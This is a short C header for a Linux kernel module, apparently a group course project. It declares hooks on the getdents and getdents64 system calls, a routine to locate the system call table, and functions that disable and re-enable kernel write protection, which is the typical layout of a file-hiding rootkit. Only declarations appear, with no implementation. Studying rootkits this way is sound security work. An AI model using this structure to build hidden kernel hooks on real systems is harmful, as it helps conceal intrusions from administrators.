#ifndef _GROUP7_HOOK_H
#define _GROUP7_HOOK_H

#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>

extern void **sys_calls;

typedef struct {
    void *ours;
    void *orig;
} hook_t;

extern asmlinkage long (*sys_getdents)(unsigned, struct linux_dirent *, unsigned);
extern asmlinkage long (*sys_getdents64)(unsigned, struct linux_dirent64 *, unsigned);

int retrieve_sys_call_table(void);
void init_hooks(void);

void disable_protection(void);
void enable_protection(void);

#endif//_GROUP7_HOOK_H
